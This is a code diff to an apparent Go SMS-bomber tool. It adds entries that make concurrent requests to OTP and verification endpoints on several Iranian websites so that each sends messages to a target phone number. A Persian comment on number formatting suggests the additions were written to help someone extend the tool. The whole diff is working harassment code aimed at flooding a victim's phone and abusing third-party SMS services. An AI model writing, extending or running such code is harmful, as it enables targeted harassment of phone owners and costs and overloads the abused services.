@@ -287,7 +287,31 @@ func main() {
 
 
 
-
+		// sabziman.com (Form)
+		wg.Add(1)
+		tasks <- func() {
+			formData := url.Values{}
+			formData.Set("action", "newphoneexist")
+			formData.Set("phonenumber", phone)
+			sendFormRequest(ctx, "https://sabziman.com/wp-admin/admin-ajax.php", formData, &wg, ch)
+		}
+		// ghasedak24.com (Form)
+		wg.Add(1)
+		tasks <- func() {
+			formData := url.Values{}
+			formData.Set("mobile", phone)
+			sendFormRequest(ctx, "https://ghasedak24.com/user/otp", formData, &wg, ch)
+		}
+		// api6.arshiyaniha.com (JSON)
+		wg.Add(1)
+		tasks <- func() {
+			// توجه: در نمونه شما شماره تلفن با "00" شروع میشد، اینجا از ورودی کاربر (phone) استفاده شده.
+			// اگر نیاز به فرمت "0098..." دارید، باید اینجا تبدیل انجام دهید: "0098" + strings.TrimPrefix(phone, "0")
+			sendJSONRequest(ctx, "https://api6.arshiyaniha.com/api/v2/client/otp/send", map[string]interface{}{
+				"cellphone":    phone,
+				"country_code": "98",
+			}, &wg, ch)
+		}
 // bigtoys.ir - Variation 3 (Form)
 		wg.Add(1)
 		tasks <- func() {
